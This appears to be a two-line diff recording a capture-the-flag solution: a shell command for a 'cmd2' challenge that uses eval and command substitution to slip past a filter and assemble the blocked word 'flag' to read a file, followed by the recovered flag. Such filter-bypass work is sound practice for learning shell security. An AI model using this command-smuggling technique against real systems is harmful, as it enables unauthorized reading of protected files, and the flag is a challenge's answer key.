@@ -1,0 +1,2 @@
+./cmd2 '$(eval "cd ..; cd ..; cd bin; pwd")$(eval "cd ..;cd ..; pwd")cat <$(echo fl)$(echo ag)'
+flag: FuN_w1th_5h3ll_v4riabl3s_haha
